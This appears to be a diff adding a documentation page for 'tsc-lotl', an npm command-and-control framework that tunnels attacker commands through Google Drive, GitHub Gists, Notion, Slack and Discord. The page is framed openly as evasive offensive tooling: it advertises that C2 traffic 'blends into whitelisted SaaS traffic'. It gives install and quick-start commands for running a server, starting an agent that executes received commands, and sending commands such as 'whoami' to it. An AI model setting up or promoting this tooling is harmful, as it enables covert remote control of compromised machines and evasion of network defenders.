@@ -1,0 +1,87 @@
+---
+title: tsc-lotl — Living-off-the-Land C2
+description: C2 infrastructure using Google Drive, GitHub Gists, Notion, Slack, and Discord as command channels
+---
+
+# tsc-lotl
+
+Living-off-the-Land C2 — uses legitimate cloud APIs as C2 channels. No dedicated server needed. Your C2 traffic blends into whitelisted SaaS traffic.
+
+## Installation
+
+```bash
+npm install -g tsc-lotl
+```
+
+## Quick Start
+
+### Generate config template
+
+```bash
+tsc-lotl config init
+```
+
+Edit `tsc-lotl-config.json` with your API tokens.
+
+### Start the C2 server
+
+```bash
+tsc-lotl server --config tsc-lotl-config.json
+```
+
+### Start an agent
+
+```bash
+tsc-lotl agent --config tsc-lotl-config.json --id myagent
+```
+
+### Send a command
+
+```bash
+tsc-lotl send --channel gdrive --agent myagent --cmd "whoami"
+```
+
+### List channels
+
+```bash
+tsc-lotl channels
+```
+
+## Channels
+
+| Channel | API | Method | Limits |
+|---------|-----|--------|--------|
+| **Google Drive** | `https://www.googleapis.com/drive/v3/files` | File-based queue in hidden folder | 10MB/file, 10 req/s |
+| **GitHub Gist** | `https://api.github.com/gists` | Anonymous gists with encoded payload | 1MB/gist, 60 req/hr |
+| **Notion** | `https://api.notion.com/v1/databases/.../query` | Database rows with status workflow | 3 req/s |
+| **Slack** | `https://slack.com/api/chat.postMessage` | Channel messages with `!c2` prefix | Varies by plan |
+| **Discord** | Discord webhooks + bot API | Channel messages with prefix | 30 req/min |
+
+## All 5 channels work out of the box:
+
+- **AES-256-CBC** encryption on all command payloads
+- **Auto-failover**: tries channels in priority order
+- **Channel health tracking**: up/down/degraded per channel
+- **Base64 encoding** wrapping encrypted payloads
+
+## CLI Reference
+
+### `tsc-lotl server`
+
+Starts daemon polling all channels for agent results every 30s.
+
+### `tsc-lotl agent`
+
+Polls all channels every 15s, executes received commands, sends results back.
+
+### `tsc-lotl config init`
+
+Creates `tsc-lotl-config.json` template with placeholder API keys.
+
+### `tsc-lotl channels`
+
+Shows all 5 channels and their current health status.
+
+## License
+
+GPL-3.0
